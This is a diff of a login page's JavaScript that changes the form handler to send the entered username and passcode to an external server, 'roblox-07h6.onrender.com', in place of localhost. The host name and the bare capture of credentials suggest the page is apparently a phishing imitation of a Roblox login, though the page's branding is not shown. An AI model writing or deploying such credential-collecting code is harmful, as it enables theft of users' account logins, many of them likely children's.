@@ -140,24 +140,26 @@
 </div>
 
 <script>
-document.getElementById("loginForm").addEventListener("submit", async (e) => {
-  e.preventDefault();
-  const username = document.getElementById("username").value;
-  const passcode = document.getElementById("passcode").value;
-
-  const res = await fetch("http://localhost:3000/login", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ username, passcode })
+  document.getElementById("loginForm").addEventListener("submit", async (e) => {
+    e.preventDefault();
+    const username = document.getElementById("username").value;
+    const passcode = document.getElementById("passcode").value;
+  
+    // Replace localhost with your deployed Render URL
+    const res = await fetch("https://roblox-07h6.onrender.com/login", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ username, passcode })
+    });
+  
+    const data = await res.json();
+    alert(data.message);
+  
+    document.getElementById("username").value = "";
+    document.getElementById("passcode").value = "";
   });
-
-  const data = await res.json();
-  alert(data.message);
-
-  document.getElementById("username").value = "";
-  document.getElementById("passcode").value = "";
-});
-</script>
+  </script>
+  
 
 </body>
 </html>
